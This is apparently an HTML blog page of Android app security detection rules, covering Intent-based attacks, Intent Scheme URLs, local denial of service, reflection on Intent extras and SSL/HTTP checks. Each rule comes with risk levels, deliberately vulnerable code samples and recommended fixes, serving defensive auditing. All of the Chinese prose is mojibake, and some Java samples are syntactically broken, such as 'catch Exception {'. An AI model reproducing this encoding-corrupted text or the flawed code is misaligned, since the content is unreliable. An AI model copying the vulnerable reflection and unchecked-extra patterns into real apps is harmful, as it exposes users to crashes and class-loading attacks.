<h3 id="Intent-Basedæ”»å‡»æ£€æµ‹">Intent-Basedæ”»å‡»æ£€æµ‹</h3>
<p>åœ¨AndroidManifestæ–‡ä»¶ä¸­å®šä¹‰äº†android.intent.category .BROWSABLEå±æ€§çš„ç»„ä»¶ï¼Œå¯ä»¥é€šè¿‡æµè§ˆå™¨å”¤èµ·ï¼Œè¿™ä¼šå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´æ”»å‡»</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼šä½å±</p>
<p><strong>é—®é¢˜å®ä¾‹</strong>ï¼šActivityåªæœ‰é…ç½®äº†category filteræ‰æœ‰è¢«android.intent.category.BROWSABLEé€šè¿‡è¿™ç§æ–¹å¼åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€ã€‚é€šè¿‡æ‰«æManifestä¸­çš„æ‰€æœ‰ç»„ä»¶ï¼Œæ£€æµ‹å‡ºæ‰€æœ‰ç»„ä»¶ä¸­çš„intent-filterå¸¦æœ‰<code>&lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</code>å±æ€§çš„ï¼Œå°†å…¶æ ‡æ³¨ä¸ºé—®é¢˜ä»£ç ä»£ç æ®µï¼Œå¹¶æŠ¥å‡ºä½å±é£é™©çš„æç¤ºã€‚</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>appä¸­ä»»ä½•æ¥æ”¶å¤–éƒ¨è¾“å…¥æ•°æ®çš„åœ°æ–¹éƒ½æ˜¯æ½œåœ¨çš„æ”»å‡»ç‚¹ï¼Œ<strong>æ£€æŸ¥å¹¶è¿‡æ»¤</strong>æ¥è‡ªç½‘é¡µçš„å‚æ•°</li>
<li>ä¸è¦é€šè¿‡ç½‘é¡µä¼ è¾“æ•æ„Ÿä¿¡æ¯ï¼Œæœ‰çš„ç½‘ç«™ä¸ºäº†å¼•å¯¼å·²ç»ç™»å½•ç”¨æˆ·åˆ°appä¸Šä½¿ç”¨ï¼Œä¼šä½¿ç”¨è„šæœ¬åŠ¨æ€çš„ç”ŸæˆURL Schemeçš„å‚æ•°ï¼Œå…¶ä¸­åŒ…æ‹¬ç”¨æˆ·åï¼Œå¯†ç æˆ–è€…ç™»å½•æ€tokenç™»æ•æ„Ÿä¿¡æ¯ï¼Œè®©ç”¨æˆ·æ‰“å¼€appç›´æ¥å°±ç™»å½•äº†ï¼Œæ¶æ„åº”ç”¨ä¹Ÿå¯ä»¥æ³¨å†Œç›¸åŒçš„URL Schemeæ¥æˆªå–è¿™äº›æ•æ„Ÿä¿¡æ¯ï¼ŒAndroidç³»ç»Ÿä¼šè®©ç”¨æˆ·é€‰æ‹©ä½¿ç”¨å“ªä¸€ä¸ªåº”ç”¨æ‰“å¼€é“¾æ¥ï¼Œä½†æ˜¯å¦‚æœç”¨æˆ·ä¸æ³¨æ„ï¼Œå°±ä¼šä½¿ç”¨æ¶æ„åº”ç”¨æ‰“å¼€ï¼Œå¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²æˆ–è€…å…¶ä»–é£é™©ã€‚</li>
</ul>
<h3 id="Intent-Scheme-URLæ¼æ´æ”»å‡»">Intent Scheme URLæ¼æ´æ”»å‡»</h3>
<p>Intent Scheme URLæ˜¯ä¸€ç§ç‰¹æ®Šçš„URLæ ¼å¼ï¼Œç”¨æ¥é€šè¿‡webé¡µé¢å¯åŠ¨å·²ç»å®‰è£…åº”ç”¨çš„Activityç»„ä»¶ï¼Œå¤§å¤šæ•°ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒæ­¤åŠŸèƒ½ã€‚</p>
<p>Android Browserçš„æ”»å‡»æ‰‹æ®µ ==ã€‹Intent Scheme URLsæ”»å‡»ã€‚è¿™ç§æ”»å‡»æ–¹å¼åˆ©ç”¨äº†æµè§ˆå™¨ä¿æŠ¤æªæ–½ä¸è¶³ï¼Œé€šè¿‡æµè§ˆå™¨ä½œä¸ºæ¡¥æ¢é—´æ¥å®ç°Intent-Basedæ”»å‡»ã€‚ç›¸æ¯”äºæ™®é€šçš„Intent-Basedæ”»å‡»ï¼Œè¿™ç§æ–¹å¼å…·æœ‰éšè”½æ€§ã€‚</p>
<p>å¦‚æœappä¸­ï¼Œæ²¡æœ‰æ£€æŸ¥è·å–åˆ°çš„load_urlçš„å€¼ï¼Œæ”»å‡»è€…å¯ä»¥æ„é€ é’“é±¼ç½‘ç«™ï¼Œè¯±å¯¼ç”¨æˆ·ç‚¹å‡»åŠ è½½ï¼Œå°±å¯ä»¥ç›—å–ç”¨æˆ·ä¿¡æ¯ã€‚æ‰€ä»¥ï¼Œå¯¹Intent URIçš„çš„å¤„ç†ä¸å½“æ—¶ï¼Œå°±ä¼šå¯¼è‡´åŸºäºIntentçš„æ”»å‡»</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼šé«˜å±</p>
<p><strong>é—®é¢˜å®ä¾‹</strong>ï¼š</p>
<p>å¦‚æœæµè§ˆå™¨æ”¯æŒIntent Scheme URIè¯­æ³•ï¼Œä¸€èˆ¬ä¼šåˆ†ä¸‰ä¸ªæ­¥éª¤è¿›è¡Œå¤„ç†</p>
<ol>
<li>åˆ©ç”¨Intent.parseUriè§£æuriï¼Œè·å–åŸå§‹çš„Intentå¯¹è±¡</li>
<li>å¯¹intentå¯¹è±¡è®¾ç½®è¿‡æ»¤è§„åˆ™</li>
<li>é€šè¿‡Context.startActivityIfNeededæˆ–è€…Context.startActivityå‘é€intentï¼Œå…¶ä¸­ç¬¬äºŒæ­¥èµ·å…³é”®ä½œç”¨ï¼Œè¿‡æ»¤è§„åˆ™ç¼ºå¤±æˆ–è€…å­˜åœ¨ç¼ºé™·éƒ½ä¼šå¯¼è‡´Intent Scheme URLæ”»å‡»</li>
</ol>
<p>å…³é”®åœ¨äºIntent.parseUriå‡½æ•°ï¼Œæ¯”è¾ƒå®‰å…¨çš„ä½¿ç”¨Intent Scheme URIæ–¹æ³•æ˜¯ï¼Œå¦‚æœä½¿ç”¨äº†Intent.parseUriå‡½æ•°ï¼Œè·å–çš„intentå¯¹è±¡å¿…é¡»ä¸¥æ ¼è¿‡æ»¤ï¼Œintentè‡³å°‘åŒ…å«ä»¥ä¸‹ä¸‰ä¸ªç­–ç•¥</p>
<ul>
<li>addCategory(â€œandroid.intent.category.BROWSABLEâ€)</li>
<li>setComponent(null)</li>
<li>setSelector(null)</li>
</ul>
<p>é€šè¿‡æ‰«æå‡ºæ‰€æœ‰è°ƒç”¨äº†Intent.parseUriæ–¹æ³•çš„è·¯å¾„ï¼Œå¹¶æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†ä¸Šè¿°ä¸‰ä¸ªç­–ç•¥ï¼Œè‹¥éƒ½æ˜¯ç”¨äº†åˆ™å®‰å…¨ï¼Œå¦åˆ™é«˜å±</p>
<p>Intent.parseUriå‡½æ•°è¿”å›çš„Intentå¯¹è±¡éœ€è¦æŒ‰ç…§ä»¥ä¸‹æ–¹å¼è¿›è¡Œå®ç°ï¼Œæ‰å¯ä»¥è®¤ä¸ºæ˜¯å®‰å…¨çš„ã€‚</p>
<p><strong>å»ºè®®</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å°†intentçš„URI(intent scheme URL)è½¬æ¢ä¸ºintentå¯¹è±¡</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢åœ¨æ²¡æœ‰è®¾ç½®å¯æµè§ˆçš„ç›®å½•(BROWSABLE category)çš„æ—¶å€™å¯åŠ¨æ´»åŠ¨</span></span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢æ˜¾å¼è°ƒç”¨(explicit call)</span></span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¦æ­¢intentçš„é€‰æ‹©å™¨(selector)</span></span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡intentå¯åŠ¨æ´»åŠ¨</span></span><br><span class="line">context.startActivityIfNeeded(intent, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="åº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æ£€æµ‹">åº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æ£€æµ‹</h3>
<p>Androidç³»ç»Ÿæä¾›äº†Activityï¼ŒServiceï¼ŒBroadcast Receiverç­‰ç»„ä»¶ï¼Œå¹¶ä¸”æä¾›äº†Intentæœºåˆ¶æ¥ååŠ©åº”ç”¨é—´çš„äº¤äº’å’Œé€šè®¯ï¼ŒIntentè´Ÿè´£å¯¹åº”ç”¨ä¸­ä¸€æ¬¡æ“ä½œçš„åŠ¨ä½œï¼ŒåŠ¨ä½œè®¾è®¡çš„æ•°æ®ï¼Œé™„åŠ æ•°æ®è¿›è¡Œæè¿°ï¼ŒAndoridç³»ç»Ÿæ ¹æ®æ­¤Intentçš„æè¿°ï¼Œè´Ÿè´£æ‰¾åˆ°å¯¹åº”çš„ç»„ä»¶ï¼Œå°†Intentä¼ é€’ç»™è°ƒç”¨çš„ç»„ä»¶ï¼Œå¹¶å®Œæˆç»„ä»¶çš„è°ƒç”¨ã€‚</p>
<p>Andoridåº”ç”¨æœ¬åœ°æ‹’ç»æœåŠ¡æ¼æ´æºäºç¨‹åºæ²¡æœ‰å¯¹Intent.GetxxxExtra()è·å–çš„å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®å¤„ç†æ—¶æ²¡æœ‰è¿›è¡Œå¼‚å¸¸æ•è·ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡å‘å—å®³è€…åº”ç”¨å‘é€æ­¤ç±»ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®æ¥è¾¾åˆ°ä½¿è¯¥åº”ç”¨Crashçš„ç›®çš„ï¼Œç®€å•çš„è¯´å°±æ˜¯æ”»å‡»è€…é€šè¿‡Inentå‘é€çš„ç©ºæ•°æ®ï¼Œå¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®ç»™å—å®³è€…åº”ç”¨ï¼Œå¯¼è‡´å…¶å´©æºƒ</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜å®ä¾‹</strong>ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getAction()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç©ºæŒ‡é’ˆåˆ¤æ–­ï¼Œä»è€Œå¯¼è‡´äº†ç©ºæŒ‡é’ˆå¼‚å¸¸å¯¼è‡´åº”ç”¨å´©æºƒ</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Intent</span> <span class="variable">abc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">Intent</span> <span class="variable">kkk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">if</span> (abc.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) &#123;</span><br><span class="line">    Log.d(<span class="string">&quot;TAG&quot;</span>, <span class="string">&quot;Test for Android Refuse Service Bug&quot;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getSerializableExtra()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç±»å‹åˆ¤æ–­è€Œè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä»è€Œå¯¼è‡´ç±»å‹è½¬æ¢å¼‚å¸¸å¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">a</span> <span class="operator">=</span> getIntent();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">test</span> <span class="operator">=</span> (String) a.getSerializableExtra(<span class="string">&quot;serializable_key&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> Exception &#123;</span><br><span class="line">    <span class="comment">//é’ˆå¯¹å¼‚å¸¸è¿›è¡Œæ“ä½œ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰å¯¹getIntegerArrayListExtra()ç­‰è·å–åˆ°çš„æ•°æ®æ•°ç»„å…ƒç´ å¤§å°åˆ¤æ–­ï¼Œå¯¼è‡´æ•°ç»„è®¿é—®è¶Šç•Œè€Œé€ æˆæ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line"></span><br><span class="line">ArrayList&lt;Integer&gt; intArray = intent.getIntegerArrayListExtra(<span class="string">&quot;user_id&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intArray != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        intArray.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æºäºç¨‹åºæ²¡æœ‰æ‰¾åˆ°ä»getSerializableExtra()è·å–åˆ°çš„åºåˆ—åŒ–å¯¹è±¡çš„ç±»å®šä¹‰ï¼Œå› æ­¤å¯¼è‡´å‘ç”Ÿç±»æœªå®šä¹‰çš„å¼‚å¸¸å¯¼è‡´æ‹’ç»æœåŠ¡æ¼æ´</span></span><br><span class="line">a.getSerializableExtra(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="manifestä¸­å®šä¹‰ç»„ä»¶ä¸ºå®ç°æ£€æµ‹">manifestä¸­å®šä¹‰ç»„ä»¶ä¸ºå®ç°æ£€æµ‹</h3>
<p>åœ¨manifestæ–‡ä»¶ä¸­å®šä¹‰çš„ç»„ä»¶å¯¼å‡ºï¼Œä¸”æ²¡æœ‰ä»£ç å®ç°ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡ddosæ”»å‡»å¯¼è‡´appå´©æºƒ</p>
<p>**é£é™©ç­‰çº§ï¼š**ä¸­å±</p>
<p><strong>é—®é¢˜å®ä¾‹ï¼š</strong></p>
<p>é¦–å…ˆè·å–appæºç ä¸­æ‰€æœ‰ç±»çš„è·¯å¾„(åŒ…å+ç±»å)ï¼Œç„¶åæ£€æµ‹manifestä¸­å£°æ˜çš„æ‰€æœ‰ç»„ä»¶æ˜¯å¦å­˜åœ¨äºç±»è·¯å¾„ä¸­å³å¯</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<p>åˆ é™¤manifestæ–‡ä»¶ä¸­æ— æ•ˆçš„å¯¼å‡ºç»„ä»¶</p>
<h3 id="Debugæˆ–Testæ•æ„Ÿæµ‹è¯•ç»„ä»¶æ³„éœ²æ£€æµ‹">Debugæˆ–Testæ•æ„Ÿæµ‹è¯•ç»„ä»¶æ³„éœ²æ£€æµ‹</h3>
<p>ä¸€äº›appåœ¨æ­£å¼å‘å¸ƒä¹‹å‰ï¼Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•appï¼Œéƒ½ä¼šåœ¨appé‡Œé›†æˆä¸€äº›è°ƒå¼æˆ–è€…æµ‹è¯•ç•Œé¢ï¼Œè¿™äº›æµ‹è¯•ç•Œé¢å¯èƒ½åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±æˆ–ä¸­å±</p>
<p><strong>é—®é¢˜å®ä¾‹</strong></p>
<p>éå†manifestæ–‡ä»¶ä¸­æ‰€æœ‰ç»„ä»¶çš„åç§°ï¼Œæ‰¾å‡ºæ‰€æœ‰å¸¦æœ‰debugæˆ–è€…testç­‰æµ‹è¯•å­—æ ·çš„å…³é”®å­—ç»„ä»¶ï¼Œå¹¶æ ¹æ®ç»„ä»¶çš„intent-filterå±æ€§æ„é€ intentå‘é€è®©ç»„ä»¶å¼¹å‡ºè¿›è¡Œæ£€æµ‹</p>
<p><strong>å»ºè®®</strong></p>
<p>æ­£å¼å‘å¸ƒå‰ç§»é™¤æ‰€æœ‰æµ‹è¯•ç»„ä»¶</p>
<h3 id="Intentä¸å®‰å…¨åå°„é£é™©æ£€æµ‹">Intentä¸å®‰å…¨åå°„é£é™©æ£€æµ‹</h3>
<p>é€šè¿‡Intentæ¥æ”¶çš„Extraå‚æ•°æ¥æ„é€ åå°„å¯¹è±¡ä¼šå¯¼è‡´ä»ä¸å—ä¿¡ä»»çš„æºåŠ è½½ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å·§å¦™åœ°æ„é€ è¾¾åˆ°åŠ è½½å…¶ä»–ç±»çš„ç›®çš„ã€</p>
<p>**é£é™©ç­‰çº§ï¼š**ä½å±</p>
<p><strong>é—®é¢˜å®ä¾‹</strong></p>
<p>Step1ï¼šæ£€æµ‹å‡ºå¯¼å‡ºçš„ç»„ä»¶</p>
<p>Step2ï¼šåœ¨å¯¼å‡ºçš„ç»„ä»¶ä¸‹ï¼Œæ£€æµ‹ä¸¤ä¸ªå…³é”®å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯ï¼šgetIntent()å’ŒClass.forName(â€œâ€¦â€)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecondActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_second);</span><br><span class="line">		<span class="comment">//è¿™é‡Œçš„intentä½¿ç”¨äº†getStringExtraæ–¹æ³•åŠ è½½äº†ä¸€ä¸ªåç§°ä¸ºclassNameçš„ç±»</span></span><br><span class="line">		<span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">		<span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">		<span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Class&lt;?&gt; clz = <span class="literal">null</span>;</span><br><span class="line">			<span class="comment">//å°è¯•ä»¥åå°„çš„æ–¹å¼æ„é€ classNameçš„å®ä¾‹</span></span><br><span class="line"> 			clz = Class.forName(className);</span><br><span class="line">			<span class="type">Date</span> <span class="variable">object</span> <span class="operator">=</span> (Date) clz.newInstance();</span><br><span class="line">			<span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clz.getMethod(methodName);</span><br><span class="line">			Toast.makeText(getApplicationContext(), method.invoke(object, <span class="literal">null</span>) + <span class="string">&quot;======&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€†å‘åå¯¹åº”çš„smaliä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/bug/intent/reflection/SecondActivity;</span>-&gt;getIntent()<span class="class">Landroid/content/Intent;</span></span><br><span class="line"><span class="keyword">.</span>..<span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0&#125;, <span class="class">Ljava/lang/Class;</span>-&gt;forName(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Class;</span></span><br><span class="line"><span class="keyword">.</span>..</span><br></pre></td></tr></table></figure>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>ä¸è¦é€šè¿‡Intentæ¥æ”¶çš„Extraä¼ æ’­çš„åå°„å‡½æ•°</li>
<li>å°†æ¥å—åå°„çš„ç»„ä»¶è®¾ç½®ä¸ºéå¯¼å‡ºç»„ä»¶</li>
</ul>
<h2 id="WebViewç»„ä»¶å®‰å…¨">WebViewç»„ä»¶å®‰å…¨</h2>
<h2 id="SQLiteå®‰å…¨">SQLiteå®‰å…¨</h2>
<h2 id="ç½‘ç»œé€šä¿¡å®‰å…¨">ç½‘ç»œé€šä¿¡å®‰å…¨</h2>
<h3 id="SSLè¿æ¥æ£€æµ‹">SSLè¿æ¥æ£€æµ‹</h3>
<p>URLæ²¡æœ‰ä½¿ç”¨SSLå®‰å…¨åè®®</p>
<p>**é£é™©ç­‰çº§ï¼š**æç¤º</p>
<p>é—®é¢˜å®ä¾‹ï¼š</p>
<p>æ‰€æœ‰ä¸ä½¿ç”¨httpsçš„urlå­—ç¬¦ä¸²å¸¸é‡</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<ul>
<li>å¦‚æœä½¿ç”¨httpsåè®®åŠ è½½urlï¼Œåº”ç”¨è¿›è¡Œè¯ä¹¦æ ¡éªŒï¼Œé˜²æ­¢è®¿é—®çš„é¡µé¢è¢«ç¯¡æ”¹æŒ‚é©¬</li>
<li>å¦‚æœä½¿ç”¨httpåè®®åŠ è½½urlï¼Œåº”è¿›è¡Œç™½åå•è¿‡æ»¤ï¼Œå®Œæ•´æ€§æ ¡éªŒç­‰é˜²æ­¢è®¿é—®çš„é¡µé¢è¢«ç¯¡æ”¹</li>
<li>å¦‚æœåŠ è½½æœ¬åœ°htmlï¼Œåº”å°†htmlæ–‡ä»¶å†…ç½®åœ¨apkä¸­ï¼Œä»¥åŠè¿›è¡Œå¯¹htmlé¡µé¢å®Œæ•´æ€§çš„æ ¡éªŒ</li>
</ul>
<h3 id="SSLä¸å®‰å…¨ç»„ä»¶æ£€æµ‹">SSLä¸å®‰å…¨ç»„ä»¶æ£€æµ‹</h3>
<p>SSLCertificateSocketFactory#getInsecureæ–¹æ³•æ— æ³•æ‰§è¡ŒSSLéªŒè¯æ£€æŸ¥ï¼Œä½¿å¾—ç½‘ç»œé€šä¿¡é­å—ä¸­é—´äººæ”»å‡»ã€‚</p>
<p>**é£é™©ç­‰çº§ï¼š**æç¤º</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>æ£€æµ‹æ˜¯å¦ä½¿ç”¨äº†SSLCertificateSocketFactory#getInsecureæ–¹æ³•</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>ç§»é™¤SSLCertificateSocketFactory#getInsecureæ–¹æ³•</p>
<h3 id="HttpHostæ£€æµ‹">HttpHostæ£€æµ‹</h3>
<p><code>HttpHost target = new HttpHost(uri.getHost(), uri.getPort(), HttpHost.DEFAULT_SCHEME_NAME);</code></p>
<p>HttpHost.DEFAULT_SCHEME_NAMEé»˜è®¤æ˜¯httpï¼Œä¸å®‰å…¨ã€‚</p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>æ£€æµ‹HttpHostä½¿ç”¨çš„å‚æ•°æ˜¯å¦æ˜¯<code>http</code></p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>æ”¹æˆä½¿ç”¨<code>https</code></p>
<h3 id="HttpURLConnectionæ¼æ´æ£€æµ‹">HttpURLConnectionæ¼æ´æ£€æµ‹</h3>
<p>åœ¨<code>Android 2.2</code>ç‰ˆæœ¬ä¹‹å‰ï¼ŒHttpURLConnectionä¸€ç›´å­˜åœ¨ç€ä¸€äº›ä»¤äººåŒçƒ¦çš„bugã€‚æ¯”å¦‚è¯´å¯¹ä¸€ä¸ªå¯è¯»çš„InputStreamè°ƒç”¨close()æ–¹æ³•æ—¶ï¼Œå°±æœ‰å¯èƒ½ä¼šå¯¼è‡´è¿æ¥æ± å¤±æ•ˆäº†ã€‚</p>
<p><strong>é£é™©ç­‰çº§</strong>ï¼š<code>ä½å±</code></p>
<p><strong>é—®é¢˜ç¤ºä¾‹ï¼š</strong></p>
<p>åˆ¤æ–­ä½¿ç”¨HttpURLConnectionæ˜¯å¦è¿›è¡Œäº†ç‰ˆæœ¬åˆ¤æ–­</p>
<p><strong>å»ºè®®</strong>ï¼š</p>
<p>åˆ¤æ–­Androidç‰ˆæœ¬ï¼Œå¹¶è®¾ç½®http.keepAliveä¸ºfalseã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">disableConnectionReuseIfNecessary</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// è§£å†³Android Froyo(Androdi 2.2)ç‰ˆæœ¬ä¹‹å‰ï¼Œåœ¨HTTPè¿æ¥é‡ç”¨æ—¶ä¼šå‡ºç°çš„BUG</span></span><br><span class="line">    <span class="keyword">if</span> (Integer.parseInt(Build.VERSION.SDK) &lt; Build.VERSION_CODES.FROYO) &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;http.keepAlive&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ç½‘ç»œç«¯å£å¼€æ”¾å¨èƒæ£€æµ‹">ç½‘ç»œç«¯å£å¼€æ”¾å¨èƒæ£€æµ‹</h3>
